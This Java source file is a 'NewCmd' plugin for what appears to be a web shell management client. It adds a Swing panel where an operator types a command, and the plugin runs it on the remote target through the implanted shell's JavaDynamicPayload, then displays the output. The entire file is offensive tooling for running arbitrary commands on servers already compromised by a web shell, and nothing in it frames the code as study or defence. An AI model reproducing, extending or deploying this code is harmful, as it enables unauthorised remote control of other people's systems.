package shells.plugins.nex121;


import core.annotation.PluginAnnotation;
import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;

import java.awt.*;
import java.awt.event.ActionEvent;
import javax.swing.*;

import util.automaticBindClick;

@PluginAnnotation(Name = "NewCmd", payloadName = "JavaDynamicPayload", DisplayName = "NewCmd")
public class NewCmd implements Plugin {
    private Payload payload;
    private JPanel panel = new JPanel(new BorderLayout());
    private JSplitPane newCmdSplitPane = new JSplitPane();
    private JLabel cmdLabel = new JLabel("执行命令: ");
    private JTextField cmdTextField = new JTextField(36);
    private JButton runButton = new JButton("运行");
    private RTextArea cmdTextArea = new RTextArea();

    public NewCmd() {
        this.newCmdSplitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.newCmdSplitPane.setDividerSize(0);
        JPanel newCmdTopPanel = new JPanel();
        newCmdTopPanel.add(this.cmdLabel);
        newCmdTopPanel.add(this.cmdTextField);
        newCmdTopPanel.add(this.runButton);
        this.newCmdSplitPane.setTopComponent(newCmdTopPanel);
        this.newCmdSplitPane.setBottomComponent(new JScrollPane(this.cmdTextArea));
        this.panel.add(this.newCmdSplitPane);
    }

    private void runButtonClick(ActionEvent actionEvent) {
        final String cmdPattern = this.cmdTextField.getText();
        new Thread() {
            public void run() {
                String cmdResult = NewCmd.this.payload.execCommand(cmdPattern);
                NewCmd.this.cmdTextArea.setText(cmdResult);
                JOptionPane.showMessageDialog(NewCmd.this.panel, "NewCmd Execution Completed!", "提示", JOptionPane.INFORMATION_MESSAGE);
            }
        }.start();
    }

    public void init(ShellEntity shellEntity2) {
        this.payload = shellEntity2.getPayloadModule();
        Encoding encoding = Encoding.getEncoding(shellEntity2);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
